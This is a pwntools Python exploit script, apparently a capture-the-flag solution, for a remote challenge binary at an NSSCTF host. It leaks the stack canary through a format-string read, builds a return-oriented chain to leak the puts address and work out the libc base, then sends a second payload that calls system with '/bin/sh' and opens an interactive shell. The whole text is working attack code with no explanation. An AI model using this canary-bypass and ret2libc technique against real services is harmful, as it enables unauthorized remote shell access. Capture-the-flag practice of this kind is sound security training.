from pwn import *

io = remote(b"node4.anna.nssctf.cn", 26473)
elf = ELF("./pwn")

libc = ELF("./libc6_2.23-0ubuntu10_amd64.so")

ret_addr = 0x4005F9
pop_rdi = 0x400993

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]

vuln_addr = 0x400887


io.recvuntil(b"help u!\n")
io.sendline(b"%7$p")
io.recvuntil(b"0x")
canary = int(io.recv(16), 16)

payload = (
    b"a" * (0x20 - 8)
    + p64(canary)
    + b"a" * 8
    + p64(ret_addr)
    + p64(pop_rdi)
    + p64(puts_got)
    + p64(puts_plt)
    + p64(vuln_addr)

)

io.recvuntil(b"story!")
io.sendline(payload)
io.recvuntil(b"\n")
puts_addr = u64(io.recv(6).ljust(8, b"\x00"))
print("puts address = ", hex(puts_addr))

base_addr = puts_addr - libc.sym["puts"]
print("base libc address = ", hex(base_addr))
system_addr = base_addr + libc.sym['system']
binsh_addr = base_addr + next(libc.search(b"/bin/sh\x00"))

payload = b"a" * (0x20 - 8) + p64(canary) + b"a" * 8 + p64(ret_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)

io.recvuntil(b"story!")
io.sendline(payload)

io.interactive()
